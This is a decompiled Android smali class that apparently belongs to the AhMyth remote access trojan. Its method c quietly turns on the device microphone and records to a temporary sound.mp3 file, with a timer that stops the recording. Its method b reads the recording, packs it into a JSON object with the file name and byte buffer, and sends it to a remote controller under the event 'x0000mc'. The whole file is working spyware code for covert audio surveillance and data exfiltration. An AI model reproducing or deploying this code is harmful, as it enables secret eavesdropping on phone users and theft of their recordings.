.class public abstract La/l;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field static a:Landroid/media/MediaRecorder;

.field static b:Ljava/io/File;

.field static c:Ljava/util/TimerTask;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    .line 1
    return-void
.end method

.method static synthetic a(Ljava/io/File;)V
    .locals 0

    .line 1
    invoke-static {p0}, La/l;->b(Ljava/io/File;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private static b(Ljava/io/File;)V
    .locals 6

    .line 1
    const/4 v0, 0x1

    .line 2
    const/4 v1, 0x0

    .line 3
    invoke-virtual {p0}, Ljava/io/File;->length()J

    .line 4
    .line 5
    .line 6
    move-result-wide v2

    .line 7
    long-to-int v3, v2

    .line 8
    new-array v2, v3, [B

    .line 9
    .line 10
    :try_start_0
    new-instance v4, Ljava/io/BufferedInputStream;

    .line 11
    .line 12
    new-instance v5, Ljava/io/FileInputStream;

    .line 13
    .line 14
    invoke-direct {v5, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 15
    .line 16
    .line 17
    invoke-direct {v4, v5}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 18
    .line 19
    .line 20
    invoke-virtual {v4, v2, v1, v3}, Ljava/io/BufferedInputStream;->read([BII)I

    .line 21
    .line 22
    .line 23
    new-instance v3, Lorg/json/JSONObject;

    .line 24
    .line 25
    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 26
    .line 27
    .line 28
    const-string v5, "file"

    .line 29
    .line 30
    invoke-virtual {v3, v5, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 31
    .line 32
    .line 33
    const-string v5, "name"

    .line 34
    .line 35
    invoke-virtual {p0}, Ljava/io/File;->getName()Ljava/lang/String;

    .line 36
    .line 37
    .line 38
    move-result-object p0

    .line 39
    invoke-virtual {v3, v5, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 40
    .line 41
    .line 42
    const-string p0, "buffer"

    .line 43
    .line 44
    invoke-virtual {v3, p0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 45
    .line 46
    .line 47
    invoke-static {}, La/g;->a()La/g;

    .line 48
    .line 49
    .line 50
    move-result-object p0

    .line 51
    invoke-virtual {p0}, La/g;->b()Lk/e;

    .line 52
    .line 53
    .line 54
    move-result-object p0

    .line 55
    const-string v2, "x0000mc"

    .line 56
    .line 57
    new-array v0, v0, [Ljava/lang/Object;

    .line 58
    .line 59
    aput-object v3, v0, v1

    .line 60
    .line 61
    invoke-virtual {p0, v2, v0}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;

    .line 62
    .line 63
    .line 64
    invoke-virtual {v4}, Ljava/io/BufferedInputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 65
    .line 66
    .line 67
    goto :goto_1

    .line 68
    :catch_0
    move-exception p0

    .line 69
    goto :goto_0

    .line 70
    :catch_1
    move-exception p0

    .line 71
    goto :goto_0

    .line 72
    :catch_2
    move-exception p0

    .line 73
    :goto_0
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 74
    .line 75
    .line 76
    :goto_1
    return-void
.end method

.method public static c(I)V
    .locals 4

    .line 1
    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    .line 6
    .line 7
    .line 8
    move-result-object v0

    .line 9
    :try_start_0
    const-string v1, "DIRR"

    .line 10
    .line 11
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    move-result-object v2

    .line 15
    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 16
    .line 17
    .line 18
    const-string v1, "sound"

    .line 19
    .line 20
    const-string v2, ".mp3"

    .line 21
    .line 22
    invoke-static {v1, v2, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    .line 23
    .line 24
    .line 25
    move-result-object v0

    .line 26
    sput-object v0, La/l;->b:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 27
    .line 28
    new-instance v0, Landroid/media/MediaRecorder;

    .line 29
    .line 30
    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    .line 31
    .line 32
    .line 33
    sput-object v0, La/l;->a:Landroid/media/MediaRecorder;

    .line 34
    .line 35
    const/4 v1, 0x1

    .line 36
    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 37
    .line 38
    .line 39
    sget-object v0, La/l;->a:Landroid/media/MediaRecorder;

    .line 40
    .line 41
    const/4 v1, 0x2

    .line 42
    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 43
    .line 44
    .line 45
    sget-object v0, La/l;->a:Landroid/media/MediaRecorder;

    .line 46
    .line 47
    const/4 v1, 0x3

    .line 48
    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 49
    .line 50
    .line 51
    sget-object v0, La/l;->a:Landroid/media/MediaRecorder;

    .line 52
    .line 53
    sget-object v1, La/l;->b:Ljava/io/File;

    .line 54
    .line 55
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    .line 56
    .line 57
    .line 58
    move-result-object v1

    .line 59
    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 60
    .line 61
    .line 62
    sget-object v0, La/l;->a:Landroid/media/MediaRecorder;

    .line 63
    .line 64
    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    .line 65
    .line 66
    .line 67
    sget-object v0, La/l;->a:Landroid/media/MediaRecorder;

    .line 68
    .line 69
    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    .line 70
    .line 71
    .line 72
    new-instance v0, La/l$a;

    .line 73
    .line 74
    invoke-direct {v0}, La/l$a;-><init>()V

    .line 75
    .line 76
    .line 77
    sput-object v0, La/l;->c:Ljava/util/TimerTask;

    .line 78
    .line 79
    new-instance v0, Ljava/util/Timer;

    .line 80
    .line 81
    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    .line 82
    .line 83
    .line 84
    sget-object v1, La/l;->c:Ljava/util/TimerTask;

    .line 85
    .line 86
    mul-int/lit16 p0, p0, 0x3e8

    .line 87
    .line 88
    int-to-long v2, p0

    .line 89
    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 90
    .line 91
    .line 92
    return-void

    .line 93
    :catch_0
    const-string p0, "MediaRecording"

    .line 94
    .line 95
    const-string v0, "external storage access error"

    .line 96
    .line 97
    invoke-static {p0, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 98
    .line 99
    .line 100
    return-void
.end method
